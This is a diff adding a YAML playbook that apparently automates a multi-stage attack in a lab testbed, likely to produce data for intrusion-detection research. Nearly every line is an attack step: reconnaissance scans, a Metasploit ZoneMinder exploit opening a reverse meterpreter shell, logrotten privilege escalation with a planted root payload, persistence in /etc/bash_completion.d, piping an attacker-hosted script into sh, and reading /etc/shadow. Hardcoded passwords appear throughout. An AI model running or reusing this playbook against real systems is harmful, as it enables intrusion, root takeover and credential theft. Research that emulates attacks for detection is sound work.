@@ -1,0 +1,243 @@
+####################
+#
+# Scenario 1 d b
+#
+####################
+msf_config:
+  password: hackerman
+  server: localhost
+
+vars:
+  $SERVER_ADDRESS: 192.42.0.254
+  $ATTACKER_ADDRESS: 192.42.1.174
+  $DNS_SERVER: 192.42.0.233
+  $DOMAIN: aecid-testbed.com
+  $USER: aecid
+  $DNS_LIST: /usr/local/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+  $SSH_KEY: {{sshkey.public_key}}
+
+commands:
+  - type: shell
+    cmd: 'echo "Target:  $SSH_KEY"'
+
+  - type: shell
+    cmd: dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN
+
+  - type: shell
+    cmd: sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS
+
+  - type: shell
+    cmd: "nikto -host $SERVER_ADDRESS"
+
+  - type: shell
+    cmd: "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+
+  - type: msf-module
+    cmd: exploit/unix/webapp/zoneminder_snapshots
+    creates_session: "foothold"
+    options:
+      RHOSTS: 192.42.0.254
+    payload_options:
+      LHOST: 192.42.1.174
+    payload: cmd/unix/python/meterpreter/reverse_tcp
+
+
+  - type: msf-session
+    stdapi: True
+    session: "foothold"
+    cmd: cd /tmp
+
+  - type: msf-session
+    session: "foothold"
+    cmd: upload /var/www/html/linpeas.sh
+
+
+  - type: msf-session
+    cmd: shell
+    session: "foothold"
+
+  - type: msf-session
+    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
+    session: "foothold"
+ 
+  - type: msf-session
+    cmd: export SHELL=bash
+    session: "foothold"
+ 
+  - type: msf-session
+    cmd: export TERM=xterm256-color
+    session: "foothold"
+ 
+  - type: msf-session
+    cmd: stty rows 38 columns 116
+    session: "foothold"
+
+  - type: msf-session
+    cmd: 'export PS1="PWN >"'
+    session: "foothold"
+
+  - type: msf-session
+    cmd: chmod +x linpeas.sh
+    session: "foothold"
+
+  - type: msf-session
+    cmd: ./linpeas.sh -s -q -N 2> /dev/null
+    session: "foothold"
+    end_str: "PWN >"
+
+  # wait a little bit for linpeas
+  - type: sleep
+    seconds: 380
+
+  # This command fixes the outputbuffer
+  # so that the output of the further
+  # commands will work!
+  - type: msf-session
+    read: True
+    cmd: id
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "cd /var/www/default"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: echo "if [ \`id -u\` -eq 0 ]; then \$( {{shellcode3333.stdout}} | sh ); fi" > payload
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "rm -rf log"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "mkdir log"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "echo empty > log/accesss.log"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "./logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
+    session: "foothold"
+
+  - type: sleep
+    seconds: 960
+
+  - type: msf-session
+    cmd: "id"
+    read: True
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "cat /var/www/default/payload > /etc/bash_completion.d/accesss.log"
+    session: "foothold"
+
+
+  - type: ssh
+    cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@172.17.100.121 '. /etc/bash_completion'" | at now + 10 minute
+    hostname: 192.168.100.222
+    username: aecid
+    password: aecid
+    jmp_hostname:  192.42.1.232
+    exit_on_error: False
+
+  - type: msf-module
+    cmd: exploit/multi/handler
+    creates_session: "root"
+    payload_options:
+      LHOST: 192.42.1.174
+      LPORT: 3333
+    payload: cmd/unix/python/meterpreter/reverse_tcp
+
+  - type: msf-session
+    cmd: shell
+    session: "root"
+
+  - type: msf-session
+    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
+    session: "root"
+ 
+  - type: msf-session
+    cmd: export SHELL=bash
+    session: "root"
+ 
+  - type: msf-session
+    cmd: export TERM=xterm256-color
+    session: "root"
+ 
+  - type: msf-session
+    cmd: stty rows 38 columns 116
+    session: "root"
+ 
+  - type: msf-session
+    cmd: id
+    session: "root"
+
+  - type: msf-session
+    session: "root"
+    cmd: "curl http://$ATTACKER_ADDRESS/README.txt.5 | sh"
+
+  - type: sleep
+    seconds: 40
+
+  - type: msf-session
+    cmd: id
+    read: True
+    session: "root"
+
+
+# TODO: THIS COMMAND DOES NOT WORK
+#       DON'T KNOW WHY
+#  - type: msf-session
+#    cmd: split --filter="/usr/bin/cat $FILE | /usr/bin/xargs /bin/bash -c " -C 2000 /root/README.txt
+#    session: "root"
+#
+
+#  - type: msf-session
+#    cmd: rm /root/README.txt
+#    session: "root"
+
+  - type: msf-session
+    cmd: exit
+    session: "root"
+
+  - type: msf-session
+    cmd: exit
+    session: "root"
+
+  - type: sleep
+    seconds: 30
+
+  - type: ssh
+    cmd: id
+    hostname: 192.42.0.254
+    port: 2222
+    username: debian
+    password: haveityourway
+    creates_session: "rootshell"
+    clear_cache: True
+
+  - type: ssh
+    cmd: pwd
+    session: "rootshell"
+
+  - type: ssh
+    cmd: sudo cat /etc/shadow
+    session: "rootshell"
+
+  - type: ssh
+    cmd: sudo lspci
+    session: "rootshell"
+
+  - type: ssh
+    cmd: sudo bash -c "command -v lsusb"
+    session: "rootshell"
+
+  - type: ssh
+    cmd: date
+    session: "rootshell"
+
+  - type: ssh
+    cmd: sudo find /usr -name \*virtualbox\*
+    session: "rootshell"
